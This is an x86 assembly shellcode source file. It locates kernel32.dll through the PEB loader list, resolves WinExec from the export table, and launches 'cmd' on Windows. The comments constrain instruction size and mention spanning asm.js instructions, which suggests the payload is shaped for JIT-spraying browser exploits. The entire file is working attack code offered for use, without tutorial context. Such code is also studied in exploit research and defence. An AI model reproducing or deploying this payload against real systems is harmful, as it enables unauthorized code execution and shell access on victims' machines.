; Nothing special to see here, just a shellcode as 99% out there
; $ nasm WinExec_cmd.asm
; $ r2 WinExec_cmd
; $ [0x00000000]> pd 20
; ALL INSTRUCTIONS (EXCEPT MOVS) MUST BE <= 3 BYTES IN SIZE

;SECTION .text
bits 32
;global _start
    _start:
    ; get DLL Initialization order list 
    push 0x30
    pop ebx
    mov ebx, [fs:ebx]            ; addr of process environment block (&PEB FS:[0]+0x30)
    mov ebx, [ebx + 0x0C]        ; addr of nt.dll loader: PEB+0xC : &Loader
    mov ebx, [ebx + 0x1C]        ; addr of loader.InitOrder: Loader+0x1c: dll InitOrder List

    ; push 'kernel32.dll\0\0\0\0'
    push 0
    mov ecx, '.DLL'
    push ecx
    mov ecx, 'EL32'
    push ecx
    mov ecx, 'KERN'
    push ecx

    ; search for kernel32.dll in memory
    NextModule:
        push 14
        pop ecx
        mov edi, esp                 ; addr of KERNEL.DLL string
        dec edi
        mov ebp, [ebx + 0x08]        ; base addr of module
        mov esi, [ebx + 0x20]        ; PTR to unicode name of module
        mov ebx, [ebx]               ; addr of next module
        isCharEqual:
            inc edi
            dec ecx
                jecxz GetFuncOrd     ; break if found
            xor eax, eax
            lodsw
            cmp al, 0x61
            jl SHORT isUpper
                sub al, 0x20
            isUpper:
            cmp al, [edi]
            je SHORT isCharEqual
        jmp SHORT NextModule

    GetFuncOrd:
        ; push WinExec\0
        ; push 'xec\0'
        mov ecx, '_xec'
        shr ecx, 8
        push ecx
        ; push 'WinE'
        mov ecx, 'WinE'
        push ecx

        mov ebx, ebp            ; module base
        add ebp, 0x3c           ; PE header offset
        mov ebp, [ebp]          ; PE header address
        add ebp, ebx            ; PE header
        add ebp, 0x78           ; export table offset
        mov ebp, [ebp]          ; export table address
        add ebp, ebx            ; export table
        mov eax, [ebp + 0x20]   ; ptr to names
        add eax, ebx            ; absolute
        xor edx, edx

        NextFunc:
            mov edi, esp            ; addr of WinExec\0
            push 8                  ; len(WinExec\0)    
            pop ecx
            mov esi, [eax + edx]
            add esi, ebx
            repe cmpsb              ; repe cmpsb [esi], [esi]
                jecxz GetFuncAddr 
            add edx, 4
            jmp SHORT NextFunc
            
    GetFuncAddr:
        mov edi, [ebp + 0x24]   ; address of ordinals
        add edi, ebx            ; add base
        shr edx, 1
        add edi, edx            ; add ordinal index
        xor edx, edx
        mov dx, [edi]           ; get ordinal
        mov edi, [ebp + 0x1c]   ; address of function addresses
        add edi, ebx            ; add base
        shl edx, 2
        add edi, edx            ; add function ptr index
        mov edi, [edi]          ;
        add edi, ebx            ; WinExec in edi
        ; [esp] <- cmd\0\0\0\0
        push 0
        mov eax, "_cmd"         ; this will span 2 asm.js instructions
        shr eax, 8
        push eax
        mov eax, esp
        push 5
        push eax                ; &cmd
        call edi                
        ret
